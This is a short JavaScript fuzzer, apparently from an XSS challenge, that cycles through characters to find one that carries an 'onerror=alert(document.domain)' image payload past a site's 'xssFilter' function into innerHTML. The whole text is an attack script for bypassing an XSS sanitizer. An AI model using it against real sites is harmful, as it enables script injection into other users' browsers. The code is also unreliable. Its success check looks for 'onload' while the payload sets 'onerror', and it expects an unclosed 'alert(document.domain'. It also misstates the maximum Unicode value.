// credits to liveoverflow for the idea of fuzzing
var v = 0;
while(v < 0x10FFF){ // 0x10FFF is max representable unicode
  tt = String.fromCharCode(v)
  p = "onerror" + tt + "=alert(document.domain)";
  try{ // must use in case decodeURI fails
    p=decodeURI(p);
    p= xssFilter(p);
    result.innerHTML="<img src=x "+p+">";
  }catch{}

  if(result.querySelector('img') && result.querySelector('img').getAttribute("onload") === 'alert(document.domain'){
    console.log(p.toString(16)+": " + result.innerHTML + " made from the integer: " + v);
    break;
  }
  v++;
}
console.log("ENDED")
